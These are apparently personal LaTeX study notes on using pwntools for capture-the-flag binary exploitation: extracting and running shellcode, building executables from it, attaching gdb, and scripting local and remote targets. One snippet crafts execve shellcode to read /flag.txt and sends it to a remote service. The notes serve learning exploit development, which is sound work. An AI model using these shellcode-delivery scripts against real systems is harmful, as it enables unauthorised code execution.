\section{shellcode with pwntools}

\url{https://tc.gts3.org/cs6265/2019/tut/tut03-02-pwntools.html}

\href{https://github.com/Gallopsled/pwntools-tutorial#readme}{pwntools-tutorial}

\url{https://github.com/nnamon/linux-exploitation-course/blob/master/lessons/3_intro_to_tools/lessonplan.md}

\verb+ld+ seems to have new by default protection regarding building elf from
shellcode.
add the following options  in
\verb+/usr/lib/python3.10/site-packages/pwnlib/asm.py+ to bypass that
\begin{verbatim}
linker_options = ['-z', 'execstack', '--no-warn-rwx-segments', '--no-warn-execstack']
\end{verbatim}

\subsection{Extract Shellcode from an elf binary}
\begin{verbatim}
#!/usr/bin/python3

import sys
from pwn import *

context(os="linux", arch="amd64", log_level="error")

file = ELF(sys.argv[1])
shellcode = file.section(".text")
print(shellcode.hex())
\end{verbatim}

\subsection{load and run shellcode}

\begin{verbatim}
#!/usr/bin/python3

import sys
from pwn import *

context(os="linux", arch="amd64", log_level="error")

run_shellcode(unhex(sys.argv[1])).interactive()
\end{verbatim}


\subsection{Shellcode to binary}


\begin{verbatim}
#!/usr/bin/python3

import sys, os, stat
from pwn import *

context(os="linux", arch="amd64", log_level="error")

ELF.from_bytes(unhex(sys.argv[1])).save(sys.argv[2])
os.chmod(sys.argv[2], stat.S_IEXEC)
\end{verbatim}

\subsection{local binary exploit}
\url{https://docs.pwntools.com/en/stable/tubes/processes.html}

generate a template like :
\begin{verbatim}
$ pwntools-pwn template i<binary>
\end{verbatim}

or start simply:
\begin{verbatim}
#!/usr/bin/env python3

from pwn import *

def main():
    p = process("/bin/sh")
    p.interactive()

if __name__ == '__main__':
    main()
\end{verbatim}

\begin{verbatim}
./2_interactive
Welcome to the Super Secure Shell
Password: TheRealPassword
Correct password!
$ id
uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),110(lxd),999(docker)
$ exit
\end{verbatim}


\subsection{Debugging with GDB}

\subsubsection{Manual approch}


Using the following script, we can print the process id before the interaction with the program happens.

\begin{verbatim}
    # Start a new process
    p = process("../build/3_reversing")
    # Print pid
    raw_input(str(p.proc.pid))

    p.send()
    ...
    p.interactive()

if __name__ == "__main__":
    main()
\end{verbatim}

with the pid it is possible to attach gdb
\begin{verbatim}
sudo gdb -p <pid>
\end{verbatim}

\subsubsection{Automated approch}
\href{http://docs.pwntools.com/en/stable/gdb.html}{here}


\subsection{Remote binary exploit}
\url{https://docs.pwntools.com/en/stable/tubes/sockets.html}

generate a template like :
\begin{verbatim}
$ pwntools-pwn template --host 159.65.63.151 --port 30138
\end{verbatim}

or
\begin{verbatim}
def main():
    # Start a local process
    p = remote("localhost", 1330)
    p.interactive()

if __name__ == "__main__":
    main()
\end{verbatim}

and edit the template to send / recv data from the target

\begin{verbatim}
io = start()
#gen = cyclic_gen()
#payload = gen.get(2000)
syscall = shellcraft.execve(path='/bin/cat',argv=['/bin/cat', '/flag.txt'])
print(syscall)
payload = asm(syscall).hex()
io.send(payload)
flag = io.recvline()
log.success(flag)

io.interactive()
\end{verbatim}


\section{notes}

\begin{verbatim}
    token = 0x41414141
    p.send(p32(token))
\end{verbatim}
\verb+p32()+ to pack integers into little
